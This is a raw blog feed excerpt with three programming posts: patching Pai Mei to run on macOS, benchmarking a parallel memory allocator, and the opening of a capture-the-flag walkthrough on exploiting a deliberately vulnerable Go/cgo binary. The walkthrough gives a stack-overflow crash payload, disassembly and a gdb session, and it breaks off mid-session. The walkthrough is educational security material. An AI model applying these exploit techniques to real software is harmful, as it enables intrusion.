&lt;span class="go"&gt;├── pgraph&lt;/span&gt;
&lt;span class="go"&gt;├── pida&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;├── utils&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I deleted the &lt;tt&gt;paimei/pydbg&lt;/tt&gt; directory and added a symlink to the &lt;tt&gt;pydbg64/pydbg&lt;/tt&gt; directory, then  copied the fat &lt;tt&gt;libmacdll.dylib&lt;/tt&gt; from &lt;tt&gt;pydbg64/pydbg/libmacdll.dylib&lt;/tt&gt; to &lt;tt&gt;paimei/utils&lt;/tt&gt;. This left a directory that looked like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;span class="go"&gt;paimei/&lt;/span&gt;
&lt;span class="go"&gt;├── pgraph&lt;/span&gt;
&lt;span class="go"&gt;├── pida&lt;/span&gt;
&lt;span class="go"&gt;├── pydbg -&amp;gt; ../pydbg64/pydbg&lt;/span&gt;
&lt;span class="go"&gt;├── utils&lt;/span&gt;
&lt;span class="go"&gt;│   ├── libmacdll.dylib&lt;/span&gt;
&lt;span class="go"&gt;│   └── ...&lt;/span&gt;
&lt;span class="go"&gt;└── ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We now need to install all the Pai Mei packages (&lt;tt&gt;utils&lt;/tt&gt;, &lt;tt&gt;pida&lt;/tt&gt;, &lt;tt&gt;pgraph&lt;/tt&gt;) into the correct place so python can find them.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pida /Library/Python/2.7/site-packages/pida
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pgraph /Library/Python/2.7/site-packages/pgraph
&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/utils /Library/Python/2.7/site-packages/utils
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Running Pai Mei&lt;/h3&gt;

&lt;p&gt;Before we can run Pai Mei, we must initialize the database: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python /usr/local/paimei/__setup_mysql.py localhost root rootpassword
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Next, we have to patch a few bugs in Pai Mei (it calls a deprecated function and the MySql modal tries to helpfully destroy itself after successfully connecting to the database, but unfortunately does so before Python is completely done with it).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git a/console/PAIMEIconsole.pyw b/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gh"&gt;index a45cbbf..0fea2ae 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/PAIMEIconsole.pyw&lt;/span&gt;
&lt;span class="gu"&gt;@@ -82,7 +82,7 @@ class PAIMEIapp (wx.App):&lt;/span&gt;
     &amp;#39;&amp;#39;&amp;#39;

     def OnInit (self):
&lt;span class="gd"&gt;-        wx.InitAllImageHandlers()&lt;/span&gt;
&lt;span class="gi"&gt;+#        wx.InitAllImageHandlers()&lt;/span&gt;

         splash = PAIMEIsplash()
         splash.Show()
&lt;span class="gh"&gt;diff --git a/console/support/mysql_connect_dialog.py b/console/support/mysql_connect&lt;/span&gt;
&lt;span class="gh"&gt;index 2201521..b641e37 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/support/mysql_connect_dialog.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/support/mysql_connect_dialog.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -104,7 +104,7 @@ class mysql_connect_dialog(wx.Dialog):&lt;/span&gt;
         self.parent.mysql_password = password

         self.mysql_connect(host, username, password)
&lt;span class="gd"&gt;-        self.Destroy()&lt;/span&gt;
&lt;span class="gi"&gt;+#       self.Destroy()&lt;/span&gt;

     def mysql_connect (self, host, username, password):
         try:
&lt;span class="gh"&gt;diff --git a/utils/process_stalker.py b/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gh"&gt;index 987eec9..32206e4 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/utils/process_stalker.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -281,11 +283,15 @@ class process_stalker:&lt;/span&gt;
                                 continue

                         basic_blocks.append(bb.ea_start)

                 if last_dll: self.log(&amp;quot;Setting %d breakpoints on basic blocks in %s
                 else:        self.log(&amp;quot;Setting %d breakpoints on basic blocks in ma

&lt;span class="gd"&gt;-                self.pydbg.bp_set(basic_blocks, restore=self.restore)&lt;/span&gt;
&lt;span class="gi"&gt;+                for block in basic_blocks:&lt;/span&gt;
&lt;span class="gi"&gt;+                       self.pydbg.bp_set(block, restore=self.restore)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we must make sure that python has the appropriate permisisons to monitor other processes before we can use Pai Mei. Unfortunately, this is not so easy anymore - since Snow Leopard, processes must be code signed in order to escalate privileges (a good writeup &lt;a href="http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/"&gt;here&lt;/a&gt;). We could possibly patch pydbg to ask for permissions and sign it to work or disabling some system wide setting, but for now we will just run Pai Mei as root.&lt;/p&gt;
&lt;p&gt;A last disclaimer: the process stalker uses the name of the executable to find which pida module to load. Unfortunately, it truncates the process name, striping the directory, but insists that the name matches the full path to the pida module. I managed to hard code it to just always use the first pida module, but I don't know what the correct solution is. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gh"&gt;index b37bd01..63880e3 100644&lt;/span&gt;
&lt;span class="gd"&gt;--- a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
&lt;span class="gu"&gt;@@ -166,7 +166,7 @@ class ProcessListCtrl (wx.ListCtrl, ListCtrlAutoWidthMixin, ColumnSorterMixin):&lt;/span&gt;
             heavy               = self.top.heavy.GetValue(),                \
             ignore_first_chance = self.top.ignore_first_chance.GetValue(),  \
             log                 = self.top.msg,                             \
&lt;span class="gd"&gt;-            main                = main,                                     \&lt;/span&gt;
&lt;span class="gi"&gt;+            main                = self.top.pida_modules.keys()[0],          \&lt;/span&gt;
             mysql               = self.top.main_frame.mysql,                \
             pida_modules        = self.top.pida_modules,                    \
             pydbg               = dbg,                                      \
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After all this, I finally got Pai Mei (barely) working but I suspect I would have had an easier time and more fun just writing it myself ;-)&lt;/p&gt;</content><category term="mac osx"></category><category term="reverse engineering"></category></entry><entry><title>Analysis of a Parallel Memory Allocator</title><link href="https://codearcana.com/posts/2012/05/11/analysis-of-a-parallel-memory-allocator.html" rel="alternate"></link><published>2012-05-11T00:00:00-07:00</published><updated>2012-05-11T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-11:/posts/2012/05/11/analysis-of-a-parallel-memory-allocator.html</id><summary type="html">&lt;p&gt;I implemented and tested different configurations of a modern parallel memory allocator.&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Background&lt;/h1&gt;
&lt;h2&gt;Problem&lt;/h2&gt;
&lt;p&gt;Many modern programs frequently use dynamic memory allocation. However, modern
programs increasingly are multithreaded and parallel to take advantage of
increasingly parallel processors. Unfortunately, this trend conflicts with the
fact that there is a single heap in most current programs. Consequently,
research into parallel memory allocators is topical and important.&lt;/p&gt;
&lt;h2&gt;Solution?&lt;/h2&gt;
&lt;p&gt;The simplest solution to ensuring correctness in a multithread memory allocator
is to use a global lock around the heap. Unfortunately, this has
&lt;em&gt;extremely&lt;/em&gt; negative performance consequences and is almost never 
adopted by modern memory allocators. Modern memory allocators tend to adopt 
some form of the following 3 solutions:
&lt;ul&gt;
&lt;li&gt;
They partition the heap into logical arenas or chunks that handle large 
portions of the heap. This reduces contention on the global heap and 
heap data structures.
&lt;/li&gt;
&lt;li&gt;
They use fine grained locking on individual slabs or slab classes.
&lt;/li&gt;
&lt;li&gt;
They use thread local caches to provide a fast path that requires no locks.
&lt;/li&gt;
&lt;/ul&gt;&lt;/p&gt;
&lt;h2&gt;Modern memory allocators&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;As I understand, the most popular modern parallel mallocs are 
&lt;a href="https://www.facebook.com/notes/facebook-engineering/scalable-memory-allocation-using-jemalloc/480222803919"&gt;&lt;tt&gt;jemalloc&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="http://goog-perftools.sourceforge.net/doc/tcmalloc.html"&gt;&lt;tt&gt;tcmalloc&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="http://www.malloc.de/en/"&gt;&lt;tt&gt;ptmalloc&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="https://doors.gracenote.com/developer/open.html"&gt;&lt;tt&gt;concur&lt;/tt&gt;&lt;/a&gt;, 
&lt;a href="http://www.nedprod.com/programs/portable/nedmalloc/"&gt;&lt;tt&gt;nedmalloc&lt;/tt&gt;&lt;/a&gt;
and &lt;a href="http://www.cs.umass.edu/~emery/pubs/berger-asplos2000.pdf"&gt;&lt;tt&gt;hoard&lt;/tt&gt;&lt;/a&gt;. 
Oracle did some 
&lt;a href="http://developers.sun.com/solaris/articles/multiproc/multiproc.html"&gt;investigation&lt;/a&gt; 
and I have taken a look at the internals of jemalloc, tcmalloc, concur, and hoard. 
As I understand:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;tt&gt;tcmalloc&lt;/tt&gt; uses a global slab allocator with thread local caches to avoid contention&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;hoard&lt;/tt&gt; uses different arenas and assigns superblocks to threads to avoid contention&lt;/li&gt;
    &lt;li&gt;&lt;tt&gt;jemalloc&lt;/tt&gt; uses different arenas and thread local caches to avoid contention
and uses red black trees and an optimized slab allocator to avoid fragmentation&lt;/li&gt;
&lt;li&gt;&lt;tt&gt;concur&lt;/tt&gt; uses different arenas and fine grained locking on size classes to avoid contention&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
One interesting characteristic of many of these memory allocators is that they
all tend to allocate memory from the system in chunks of about 1 to 4MB.
Consequently, they tend to have an overhead of up to 2 to 4MB per arena. Most
of them justify this overhead by pointing out that 2MB of overhead is minimal
when the total application footprint can exceed 1GB (in an application such as
firefox) and it is acceptable for an application to use 2MB of heap when
modern computers routinely have several GB of RAM.
&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;
Another interesting characteristic of these memory allocators is they almost
never coallesce individual blocks (some do coallesce individual blocks). 
Instead, they use slab allocators and assume
allocation requests tend be of very similar sizes. In general, this follows
the general pattern of tolerating a moderate amount of memory overhead to
increase performance.
&lt;/p&gt;

&lt;h1&gt;Approach&lt;/h1&gt;
&lt;h2&gt;A simple modern memory allocator&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
In order to investigate and analyze the performance of a modern memory
allocator, I wrote a simplified memory allocator, &lt;tt&gt;ar_malloc&lt;/tt&gt;, that 
uses many of the modern optimizations. &lt;tt&gt;ar_malloc&lt;/tt&gt; is based quite
heavily on &lt;tt&gt;jemalloc&lt;/tt&gt; but makes some simplifications. In order to keep 
the work manageable, &lt;tt&gt;ar_malloc&lt;/tt&gt; makes the assumption that allocation 
requests are smaller than 1024 bytes. In addition, it uses slabs of a fixed 
size and never frees memory to the system (&lt;tt&gt;jemalloc&lt;/tt&gt; uses variable sized
slabs to reduce memory overhead).
&lt;/p&gt;&lt;/p&gt;
&lt;h2&gt;Testing a memory allocator ##&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
In order to test &lt;tt&gt;ar_malloc&lt;/tt&gt;, I constructed a test framework (based off a
test in the &lt;tt&gt;tcmalloc&lt;/tt&gt; codebase) that spawns 
several threads that each randomly decide to allocate a random sized block or 
free a random block. This does not simulate the effect of actually using the blocks
and does not simulate a realistic workload, but it is still a useful
basis for investigation. I ran this test on a 16 core shared memory system and used
new initialization of malloc for each run to reduce the variance in run time.
&lt;/p&gt;&lt;/p&gt;
&lt;h1&gt;Results&lt;/h1&gt;
&lt;h2&gt;Comparision of &lt;tt&gt;ar_malloc&lt;/tt&gt; to other solutions&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
We compared the performance of &lt;tt&gt;ar_malloc&lt;/tt&gt;, &lt;tt&gt;ar_malloc&lt;/tt&gt; with a global lock, 
and the libc malloc on the test described in the previous section.
&lt;/p&gt;
&lt;figure&gt;
&lt;img alt="Run time vs Number of threads" src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;amp;oid=4&amp;amp;zx=1aneio5en2km"&gt;
&lt;figcaption&gt;This is chart of test run time vs number of threads for a global locked malloc, &lt;tt&gt;ar_malloc&lt;/tt&gt;, and libc malloc. As 
    you can see, the global lock solution is really bad.&lt;/figcaption&gt;
&lt;/figure&gt;&lt;/p&gt;
&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=14&amp;zx=rgpgcr33f1ax" /&gt;
    &lt;figcaption&gt;This is chart of test run time vs number of threads for &lt;tt&gt;ar_malloc&lt;/tt&gt; and libc malloc. As 
    you can see, &lt;tt&gt;ar_malloc&lt;/tt&gt; is about 3 times faster than libc for even
    single threaded execution. &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=8&amp;zx=ttz2qtfnzo60" /&gt;
    &lt;figcaption&gt;This is chart of test speedup vs number of threads for &lt;tt&gt;ar_malloc&lt;/tt&gt; and libc malloc. As 
    you can see, &lt;tt&gt;ar_malloc&lt;/tt&gt; exhibits linear speedup that scales cleanly with
    the number of threads, whereas libc scales only to about 8 threads. 
    &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h2&gt;Comparison of different configuration&lt;/h2&gt;
&lt;p&gt;&lt;p&gt;
I examined several different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;, specifically 
focusing on the number of arenas. We attempted to figure out the effect of and 
analyze the behavior of using different number of arenas.
&lt;/p&gt;&lt;/p&gt;
&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=11&amp;zx=fwaahh94nhlg" /&gt;
&lt;figcaption&gt;This is a chart of run time vs number of threads for different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;.
    As you can see, there appear to be two curves. We will call the lower one the &amp;quot;no contention&amp;quot; curve and the
    upper one the &amp;quot;contention&amp;quot; curve. You can see that the performance of a memory allocator moves from the &amp;quot;no contention&amp;quot;
    curve to the &amp;quot;contention&amp;quot; curve when the number of threads exceeds the number of arenas.
    &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
    &lt;img src="https://docs.google.com/spreadsheet/oimg?key=0AjzaNgu-PE5_dDJJUnRCaXZueks1UTlQVXBxYlFsSXc&amp;oid=13&amp;zx=fhdbihufrx4u" /&gt;
    &lt;figcaption&gt;
    This is a chart of speedup vs number of threads for different configurations of &lt;tt&gt;ar_malloc&lt;/tt&gt;. As you before, there are 
    two curves: the &amp;quot;no contention&amp;quot; line and the &amp;quot;contention&amp;quot; line. Again, the speedup of a memory allocator
    moves from the &amp;quot;no contention&amp;quot; line to the &amp;quot;contention&amp;quot; line when the number of threads exceeds the 
    number of arenas. It is important to note that the speedup is still mostly linear even when the number of arenas is far less
    than number of threads.
    &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Over the course of this project, I have demonstrated that it is feasible to 
write a modern parallel memory allocator that performs quite favorably 
on random workloads. &lt;tt&gt;ar_malloc&lt;/tt&gt; makes many simplifying assumptions,
but is just over 2000 lines of code, outperforms libc malloc by a factor
of 3, and demonstrates linear speedup that seems to scale very well with
the number of threads.&lt;/p&gt;
&lt;h1&gt;Further Investigation&lt;/h1&gt;
&lt;p&gt;&lt;p&gt;
There are several routes for further investigation in parallel memory
allocators.&lt;/p&gt;
&lt;p&gt;The exisiting test framework allocates random sizes distributed
uniformly in the range 8, 1024. This almost certainly does not simulate 
realistic memory allocation patterns. An interesting further exploration could
use &lt;tt&gt;ar_malloc&lt;/tt&gt; with real programs (either via static linking or LD_PRELOAD) 
or to investigate the actual memory distribution of a general program. 
&lt;/p&gt;
&lt;p&gt;This investigation only examined the effect of different number of arenas.
A further exploration could examine the effect of thread local caches and fine
grained locking on the performance of &lt;tt&gt;ar_malloc&lt;/tt&gt;.
&lt;/p&gt;&lt;/p&gt;</content><category term="malloc"></category></entry><entry><title>Securing and Exploiting Go Binaries</title><link href="https://codearcana.com/posts/2012/05/06/securing-and-exploiting-go-binaries.html" rel="alternate"></link><published>2012-05-06T00:00:00-07:00</published><updated>2012-05-06T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-06:/posts/2012/05/06/securing-and-exploiting-go-binaries.html</id><summary type="html">&lt;p&gt;I have spent some time over the past month or so trying to use Go binaries in a secure manner and trying to exploit Go binaries and I thought it would be useful if I talked a little bit about my journey.&lt;/p&gt;</summary><content type="html">&lt;h3&gt;Introduction&lt;/h3&gt;

&lt;p&gt;
First, I have been working in Go for about a year now. As part of this years pCTF, I created a problem that involved exploiting a Go binary (binary and source &lt;a href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/bunyan-wp.tar.gz"&gt;here&lt;/a&gt;). I consequently had to deal with securing the binary to prevent leaking unnecessary information and had some fun playing around with exploiting a Go binary.
&lt;/p&gt;

&lt;h3&gt;Securing a Go Binary&lt;/h3&gt;

&lt;p&gt;
Creating a secure, production-ready Go binary was more challenging than expected. By default: &lt;ul&gt;
    &lt;li&gt;The Go build tools include the full path to the source on the build machine in the binary. &lt;/li&gt;
    &lt;li&gt;Go binaries helpfully print the faulting address and instruction on segmentation faults.&lt;/li&gt;
    &lt;li&gt;The heap in Go is loaded at a fixed address and is executable.&lt;/li&gt;
    &lt;li&gt;Go binaries are linked with full debug information.&lt;/li&gt;
&lt;/ul&gt;
I filed a &lt;a href="http://code.google.com/p/go/issues/detail?id=3467"&gt;issue&lt;/a&gt; suggesting the option for a compiler flag to create a hardended binary, but there has not been much interest in that yet.
&lt;/p&gt;

&lt;p&gt;
Some of these problems can be mitigated with appropriate hacks. The path to the Go runtime can be changed by setting the environment variable &lt;tt&gt;GOROOT_FINAL&lt;/tt&gt; before running &lt;tt&gt;all.bash&lt;/tt&gt; (see &lt;a href="http://code.google.com/p/go/issues/detail?id=3467#c4"&gt;this comment&lt;/a&gt; on the issue I filed). For user code, it takes some more work: I had to deep copy all of my source into a &lt;tt&gt;/tmp/build&lt;/tt&gt; directory before compiling so that the only string was a &lt;tt&gt;"/tmp/build"&lt;/tt&gt; rather than the actual path.
&lt;/p&gt;

&lt;p&gt;
Some debug information can be stripped by passing &lt;tt&gt;-s&lt;/tt&gt; as a command line to the linker (for example, &lt;tt&gt;go build -ldflags "-s" prog.go&lt;/tt&gt;). Note that this does not remove file paths, etc from the binary. It is pretty easy to patch the Go runtime to avoid printing the faulting address and instruction, but that should probably take the form of a real change rather than a quick and dirty patch. Unfortunately, the heap to be seems executable and loaded into fixed location by design (so that closures are easier and that heap addresses do not overlap with valid unicode strings, making the garbage collector easier), so it is not clear that that will be fixed for anytime soon.
&lt;/p&gt;

&lt;h3&gt;Exploiting a Go program&lt;/h3&gt;

&lt;h4&gt;Disclaimer&lt;/h4&gt;

&lt;p&gt;
First things first - I did &lt;em&gt;not&lt;/em&gt; find an exploit in the Go runtime that gave code execution. Instead, I linked the Go binary to a cgo library that had an intentional vulnerability. I had to do some work to make the cgo library exploitable. I made an explicitly vulnerabile C program and specified flags &lt;tt&gt;-fno-stack-protector -U_FORTIFY_SOURCE&lt;/tt&gt; to discard modern protections. Lastly, the behavior I performed in cgo (printing a string to stdout) could have trivially been perfomed in pure Go.
&lt;/p&gt;

&lt;p&gt;
However, I personally feel like Go packages use the unsafe package or are linked against full C libraries commonly enough (consider banthars &lt;a href="https://github.com/banthar/gl"&gt;package&lt;/a&gt; with Go bindings for OpenGl or a &lt;a href="http://go-lang.cat-v.org/library-bindings"&gt;variety&lt;/a&gt; of other packages) that it is irresponsible for the Go runtime to be poorly secured out of the claim that there are no vulnerabilies in Go. Furthermore, the Go runtime should be better secured to avoid the damage from any as of yet undiscovered vulnerabilities in the Go runtime.
&lt;/p&gt;

&lt;p&gt;
Going forward, I will assume that there is a vulnerability (introduced possibly by a vulnerable C library) and will focus on one interesting way to exploit it by using the Go runtime. I will specifically focus on the &lt;a href="webapp"&gt;&lt;tt&gt;webapp&lt;/tt&gt;&lt;/a&gt; problem used in pCTF.
&lt;/p&gt;

&lt;h4&gt;The actual exploit&lt;/h4&gt;

&lt;p&gt;
The Go runtime has some really interesting properties that make it fun to exploit:
&lt;ul&gt;
    &lt;li&gt;The heap is executable.&lt;/li&gt;
    &lt;li&gt;The heap is deterministic and in a fixed location every run&lt;/li&gt;
    &lt;li&gt;Immutable strings tend to end up on the heap&lt;/li&gt;
&lt;/ul&gt;
We will construct an exploit that takes advantage of all of these properties. First, we get get a vulnerability that gives us a crash.
&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp --loglevel&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; --logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAAAAAAA%8d&amp;quot;&lt;/span&gt; --address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;perl -e &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;
&lt;span class="go"&gt;unexpected fault address 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;throw: fault&lt;/span&gt;
&lt;span class="go"&gt;[signal 0xb code=0x1 addr=0x42424242 pc=0x42424242]&lt;/span&gt;

&lt;span class="go"&gt;goroutine 1 [syscall]:&lt;/span&gt;
&lt;span class="go"&gt;levellog._Cfunc_Log(0xb736e0b0, 0xb736e0c8)&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/go-build279009652/levellog/_obj/_cgo_defun.c:50 +0x32&lt;/span&gt;
&lt;span class="go"&gt;levellog.Log(0x1, 0x1883cd00, 0x7f)&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/go-build279009652/levellog/_obj/log.cgo1.go:126 +0x140&lt;/span&gt;
&lt;span class="go"&gt;main.main()&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/build/src/webapp/main.go:21 +0x101&lt;/span&gt;

&lt;span class="go"&gt;goroutine 2 [syscall]:&lt;/span&gt;
&lt;span class="go"&gt;created by runtime.main&lt;/span&gt;
&lt;span class="go"&gt;    /usr/local/src/go/src/pkg/runtime/proc.c:221&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we have code execution (and we know the vulnerable function due to the helpful stack trace), we &lt;tt&gt;objdump&lt;/tt&gt; the function and put a breakpoint before returning to our clobbered return address.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mh"&gt;080624d0&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nf"&gt;Log&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;:&lt;/span&gt;
&lt;span class="x"&gt; 80624d0:       81 ec 9c 00 00 00       sub    $0x9c,%esp&lt;/span&gt;
&lt;span class="x"&gt; 80624d6:       8b 84 24 a4 00 00 00    mov    0xa4(%esp),%eax&lt;/span&gt;
&lt;span class="x"&gt; 80624dd:       89 9c 24 94 00 00 00    mov    %ebx,0x94(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624e4:       e8 4f 00 00 00          call   8062538 &amp;lt;__i686.get_pc_thunk.bx&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 80624e9:       81 c3 17 7b 25 00       add    $0x257b17,%ebx&lt;/span&gt;
&lt;span class="x"&gt; 80624ef:       89 b4 24 98 00 00 00    mov    %esi,0x98(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624f6:       8d 74 24 10             lea    0x10(%esp),%esi&lt;/span&gt;
&lt;span class="x"&gt; 80624fa:       89 44 24 0c             mov    %eax,0xc(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624fe:       8b 84 24 a0 00 00 00    mov    0xa0(%esp),%eax&lt;/span&gt;
&lt;span class="x"&gt; 8062505:       89 34 24                mov    %esi,(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 8062508:       89 44 24 08             mov    %eax,0x8(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 806250c:       8d 83 00 c3 f2 ff       lea    -0xd3d00(%ebx),%eax&lt;/span&gt;
&lt;span class="x"&gt; 8062512:       89 44 24 04             mov    %eax,0x4(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 8062516:       e8 ad 6c 25 00          call   82b91c8 &amp;lt;sprintf@plt&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 806251b:       89 34 24                mov    %esi,(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 806251e:       e8 b5 6c 25 00          call   82b91d8 &amp;lt;puts@plt&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 8062523:       8b 9c 24 94 00 00 00    mov    0x94(%esp),%ebx&lt;/span&gt;
&lt;span class="x"&gt; 806252a:       8b b4 24 98 00 00 00    mov    0x98(%esp),%esi&lt;/span&gt;
&lt;span class="x"&gt; 8062531:       81 c4 9c 00 00 00       add    $0x9c,%esp&lt;/span&gt;
&lt;span class="x"&gt; 8062537:       c3                      ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb webapp
&lt;span class="go"&gt;GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08&lt;/span&gt;
&lt;span class="go"&gt;Copyright (C) 2011 Free Software Foundation, Inc.&lt;/span&gt;
&lt;span class="go"&gt;License GPLv3+: GNU GPL version 3 or later&lt;/span&gt;
&lt;span class="go"&gt;This is free software: you are free to change and redistribute it.&lt;/span&gt;
&lt;span class="go"&gt;There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;and &amp;quot;show warranty&amp;quot; for details.&lt;/span&gt;
&lt;span class="go"&gt;This GDB was configured as &amp;quot;i686-linux-gnu&amp;quot;.&lt;/span&gt;
&lt;span class="go"&gt;For bug reporting instructions, please see:&lt;/span&gt;
&lt;span class="go"&gt;...&lt;/span&gt;
&lt;span class="go"&gt;Reading symbols from /tmp/build/webapp...done.&lt;/span&gt;
&lt;span class="go"&gt;Loading Go Runtime support.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) b *0x8062537&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x8062537&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We run our exploit again, and then search the heap for our string (we know that the heap is always in the range &lt;tt&gt;[0x18600000, 0x18900000]&lt;/tt&gt; for this binary since Go has a deterministic heap).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;(gdb) run --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
